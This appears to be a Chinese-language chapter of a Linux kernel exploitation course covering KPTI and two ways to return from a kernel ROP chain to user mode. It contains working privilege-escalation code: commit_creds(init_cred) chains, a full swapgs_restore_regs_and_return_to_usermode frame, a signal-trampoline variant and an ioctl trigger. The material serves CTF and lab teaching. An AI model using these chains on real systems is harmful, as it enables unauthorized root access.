# Ch 7 — KPTI：swapgs_restore_regs_and_return_to_usermode 與 signal trampoline

> 目標：KPTI 打開後 kernel / user 用兩張 page table。ROP 結束直接 `iretq` 會炸，因為 CR3 還是 kernel 的。這章學兩個乾淨出口 — `swapgs_restore_regs_and_return_to_usermode`（kernel 自備）、signal trampoline（kernel 幫你自動做）。

## KPTI 到底在動什麼

背景：**Meltdown**（CVE-2017-5754）讓 unprivileged user 透過 cache side channel 讀任意 kernel memory。原因：user process 的 page table 裡**也有** kernel mapping（只是被 U/S bit 擋住），Meltdown 繞過 permission check。

KPTI（Kernel Page Table Isolation）的解法：
- 每個 process 有**兩張** page table — user CR3、kernel CR3
- user 那張只 map 極少 kernel code（entry trampoline 一小塊，`_entry_text` 段）
- syscall 進 kernel → entry code 第一件事把 CR3 從 user 切到 kernel
- 出 kernel → 切回 user CR3

```
user space                         kernel space
┌──────────────┐                  ┌──────────────┐
│ user text    │                  │ user text    │
│ user heap    │                  │ user heap    │
│ user stack   │ entry            │ user stack   │
│              │ trampoline       │              │
│ kernel       │ ───────►         │ kernel text  │
│ （完全看不到）│  切 CR3          │ kernel heap  │
└──────────────┘                  │ physmap      │
  CR3 = user                      │ ...          │
                                  └──────────────┘
                                    CR3 = kernel
```

**只有 `entry_*` 函式在 user CR3 下也能執行**，其他 kernel code 都在 user CR3 下「不存在」。

## 為什麼 Ch 5 的 exploit 現在會炸

ROP chain 最後是：

```
swapgs_restore_regs_and_return_to_usermode + 0x17
<user_rip> <user_cs> <user_rflags> <user_rsp> <user_ss>
```

我們直接跳到 swapgs + iretq 那兩行。但 **CR3 沒換**！iretq 完 CPU 進 user ring，rip 指向 user code — 可是 CR3 還在 kernel，user rip 這個虛擬地址 **在 kernel CR3 裡沒 map user text**，#PF。

Ch 5 我們用的**偏移是 `+0x17`**，那是 swapgs 的位置。真正的出口要用 `swapgs_restore_regs_and_return_to_usermode` 的 **整個 function 流程** — 它會：

1. pop 所有 regs 從 `pt_regs`
2. **切 CR3 回 user**（`SWITCH_TO_USER_CR3_STACK`）
3. swapgs
4. iretq

所以正確的入口**不是 +0x17**，是**前段 pop regs 開始的地方**（通常 +0x22 或附近，版本不同）。

## 正確 ROP 出口：swapgs_restore_regs_and_return_to_usermode

改版 chain（只改最後幾個 entry）：

```
[前面照 Ch 5 不變：pop_rdi, init_cred, commit_creds]

swapgs_restore_regs_and_return_to_usermode + N  ← 跳到 pop regs 開始的 offset

下面是 pt_regs 對應的 pop 順序（kernel 先 pop r15, r14, ..., 最後 iretq 5-word）
0                 ← r15 = 0
0                 ← r14
0                 ← r13
0                 ← r12
0                 ← rbp
0                 ← rbx
0                 ← r11
0                 ← r10
0                 ← r9
0                 ← r8
0                 ← rax
0                 ← rcx
0                 ← rdx
0                 ← rsi
0                 ← rdi
0                 ← orig_ax  (這個 slot 有沒有由版本定)
<user_rip>
<user_cs>
<user_rflags>
<user_rsp>
<user_ss>
```

Kernel 版本差異很大 — `entry_64.S` 的 pop 順序最好你自己進 gdb `disas swapgs_restore_regs_and_return_to_usermode` 看一遍數個數。

### 找正確偏移

```
(gdb) disas swapgs_restore_regs_and_return_to_usermode
Dump of assembler code for function swapgs_restore_regs_and_return_to_usermode:
   0xffffffff81e00e36 <+0>:   pop    %r15
   0xffffffff81e00e38 <+2>:   pop    %r14
   0xffffffff81e00e3a <+4>:   pop    %r13
   0xffffffff81e00e3c <+6>:   pop    %r12
   0xffffffff81e00e3e <+8>:   pop    %rbp
   0xffffffff81e00e40 <+10>:  pop    %rbx
   0xffffffff81e00e42 <+12>:  pop    %r11
   0xffffffff81e00e44 <+14>:  pop    %r10
   ...
   0xffffffff81e00e58 <+34>:  mov    %rsp,%rdi
   0xffffffff81e00e5b <+37>:  mov    %gs:0x6004,%rsp
   0xffffffff81e00e64 <+46>:  pushq  0x30(%rdi)
   0xffffffff81e00e68 <+50>:  pushq  0x28(%rdi)
   ...                        ; 切 CR3 in USER_CR3 macro
   0xffffffff81e00eXX <+YY>:  swapgs
   0xffffffff81e00eXX <+YY>:  iretq
```

入口要從 `+0`（pop r15）開始用整個 sequence。`+0x17` 這種偏移是舊的 CTF 題模板（KPTI 關的情況下直接跳 swapgs+iretq）。**KPTI 開了必須用整個 pop 序列**。

## 另一條路：signal trampoline（更優雅）

你不 care kernel 這段怎麼回來，有個更懶的方法：**先註冊 signal handler，raise 一個 signal**。

原理：

1. user-space 用 `sigaction` 註冊一個 SIGSEGV handler，handler 地址指向你的 shell code
2. 在 ROP 最後一步故意讓 kernel 執行一個會 #GP 或 #PF 的操作
3. Kernel 的 fault handler 把 SIGSEGV 傳回 user process
4. Kernel 自動走完整的 **signal delivery path** — 這條 path 處理 KPTI 切 CR3，一切乾淨
5. User 回來時 rip 已經在你的 handler

優點：不用手寫正確的 pop 順序，signal 機制 handle 完所有切換。

缺點：你的 ROP 最後一步必須**故意出錯**。常見做法：把最後一個 ret 的地址設成不合法值（`0xdeadbeef`），kernel 在 iretq 或 next instruction 會 #GP，進 fault handler。

範例最後幾行：

```c
/* user-space 先註冊 */
void handler(int sig, siginfo_t *si, void *ctx) {
    shell();
}
struct sigaction sa = { .sa_sigaction = handler, .sa_flags = SA_SIGINFO };
sigaction(SIGSEGV, &sa, NULL);

/* ROP chain 最後一段，不走 swapgs_restore */
chain[i++] = commit_creds;
chain[i++] = 0xdeadbeef;   /* 故意讓下一個 ret 跳到爛地址 */
/* 不用 iretq 5-word frame — signal 機制會 take over */
```

### 為什麼 signal trampoline 能繞 KPTI

signal delivery 是 kernel 內建 path：`do_signal` → `setup_rt_frame` → `__restore_rt` → `iretq`。這條整條路是 kernel 設計來從 kernel 回 user 的，KPTI CR3 切換在 `exit_to_user_mode` 裡自然做完。你不用管。

這個技巧 **2018 年以後的 kernelCTF 類題目非常流行**，因為它比手工 swapgs_restore 短很多。

## 選哪條？

| 場景 | 選 |
|---|---|
| 你能算出 kernel 版本對應的 pop 數量 | swapgs_restore（更接近真實 kernel exploit） |
| 不想管版本差異 | signal trampoline |
| ROP chain 空間吃緊 | signal trampoline（省 20 byte 以上） |
| 要寫 stable kernelCTF submission | swapgs_restore（signal 在某些 kernel config 下 flaky） |

Part 3 以後我們會同時用兩種，取決於該題的限制。

## 實測：打開 KPTI 跑 Ch 5 exploit

```bash
cd ~/kpwn/kernel/linux-6.6.60-weak
./scripts/config --enable PAGE_TABLE_ISOLATION  # KPTI
make -j$(nproc) bzImage
```

改 `run-weak.sh` `-append` 拿掉 `nopti`。

confirm guest：

```
/ # dmesg | grep -i isolation
[    0.xxx] Kernel/User page tables isolation: enabled
```

跑 Ch 5 那個 `exp`：

```
/ # /home/user/exp
[   xx.xxx] BUG: unable to handle page fault for address: 0x7fxxxxxxxxxx
[   xx.xxx] RIP: 0033:0x7fxxxxxxxxxx
...
```

pages fault at `0x7f...` — user-space 地址。KPTI CR3 沒切，user 地址在 kernel CR3 下 unmapped。

## 改成 swapgs_restore 版本

完整替換 ROP 結尾（gdb 查正確偏移後填）：

```c
#define SWAPGS_RESTORE_FULL (0xffffffff81e00e36UL + slide)
/* 整段從 +0 開始進 — pop r15/r14/.../rcx */

/* ROP chain */
chain[i++] = POP_RDI_RET + slide;
chain[i++] = INIT_CRED + slide;
chain[i++] = COMMIT_CREDS + slide;
chain[i++] = SWAPGS_RESTORE_FULL;
/* 以下 pt_regs 欄位對應 pop — 填 0 即可，kernel 不 care */
for (int j = 0; j < 15; j++) chain[i++] = 0;
/* 然後 iretq 5-word */
chain[i++] = (unsigned long)shell;
chain[i++] = saved_cs;
chain[i++] = saved_rflags;
chain[i++] = saved_sp;
chain[i++] = saved_ss;
```

再編、再跑。現在應該 root。

## 或改成 signal trampoline 版本

```c
void handler(int sig, siginfo_t *si, void *ctx) {
    shell();
}
int main(void) {
    struct sigaction sa = { .sa_sigaction = handler, .sa_flags = SA_SIGINFO };
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    /* ... leak, open, ... */
    chain[i++] = POP_RDI_RET + slide;
    chain[i++] = INIT_CRED + slide;
    chain[i++] = COMMIT_CREDS + slide;
    chain[i++] = 0xdeadbeef;  /* 爛地址觸發 #GP → SIGSEGV → handler */

    struct echo_req req = { .len = i * 8, .buf = (char*)chain };
    ioctl(fd, VULN_ECHO, &req);
    return 0;
}
```

兩版效果一樣，後者乾淨得多。

## CR3 切換的細節（想深一層的人）

你在 gdb 真的跑進 `swapgs_restore_regs_and_return_to_usermode` 會看到這段 macro 展開：

```asm
mov    %cr3, %rdi
or     $0x1000, %rdi       ; 設定 PCID user bit
mov    %rdi, %cr3
```

`0x1000` 是 PTI PCID 設定 bit（`PTI_USER_PCID_MASK`），表示「這是 user CR3」。PCID 讓 CR3 切換不 flush TLB — Meltdown 之後為了效能必備。

KPTI 關 PCID（`-cpu qemu64` 沒 PCID）會退回全 TLB flush 版本，慢但功能相同。

## 常見踩雷

**pop 順序數錯** — chain 裡填的 0 數量不對，iretq 的 5-word 對到錯誤位置。`gdb disas` 老老實實數 pop 有幾個。

**signal handler 沒註冊但用 signal 版** — 預設行為 SIGSEGV 會殺 process，進不了 handler。

**`sigaction` 用 `SA_RESTORER` 自訂 restorer** — 這是高階用法，除非你在寫 stager 不用管。

**KPTI 開但 PCID 沒開** — 檢查 `/proc/cpuinfo | grep pcid`。沒 pcid 也能 work，只是慢。

**CR3 切完 rip 跳去的 user 地址**不是 `shell` 而是 `0x4141...` — 你 iretq frame 的 user_rip 沒設或亂了。

**signal handler 執行但 uid 還是 1000** — `commit_creds` 沒 call 到。ROP chain 錯，回 gdb 重看。

## 動手練習

1. **在 gdb 裡 disas `swapgs_restore_regs_and_return_to_usermode`**，數 pop 有幾個，和你 chain 裡填的 0 數量對齊。版本不同這數字會變。
2. **試用 signal trampoline 版，但 ROP 最後不填 `0xdeadbeef` 而是一個 page-aligned 0x7f... 地址**。觀察 SIGBUS vs SIGSEGV，handler 能不能攔到。
3. **關 KPTI 測試 Ch 5 的 `+0x17` 偏移是否還 work** — 確認你理解那是「不切 CR3 的捷徑」，只在 KPTI 關時有效。
4. **讀 Linux 原始碼 `arch/x86/entry/entry_64.S`** 找 `SWITCH_TO_USER_CR3_STACK` macro 定義。你會看到 CR3 切換在 iretq 之前。
5. **數 pt_regs 成員**：看 `struct pt_regs` in `arch/x86/include/uapi/asm/ptrace.h`。pop 順序和這個結構的 offset 有關。

## 自我檢核

- [ ] 能解釋 KPTI 存在的動機（Meltdown），以及它做什麼（兩張 CR3、切換）
- [ ] 能說出「為什麼 Ch 5 的 `+0x17` 偏移 KPTI 下不 work」
- [ ] 能寫出 `swapgs_restore_regs_and_return_to_usermode` 從 `+0` 開始的 pop 序列大致長怎樣
- [ ] 能用 signal trampoline 技巧寫一個 exploit 收尾
- [ ] 知道兩種出口的取捨
- [ ] 瞭解 PCID 與 KPTI 的關係（效能最佳化，無關安全語意）

下一章總結 Part 2 — 你目前為止已經在 **SMEP+SMAP+canary+KASLR+KPTI 全開**的 kernel 上拿到過 root 了。Ch 8 把幾個不需要 ROP 的「任意寫提權原語」都收齊：`modprobe_path`、`core_pattern`、`poweroff_cmd`、直接改 `struct cred`。後面 heap 章節只要拿到任意寫就可以直接套這些，省下 ROP 的麻煩。

→ [Ch 8 — 經典利用原語：modprobe_path / core_pattern / poweroff_cmd / cred](./08-classic-primitives.md)
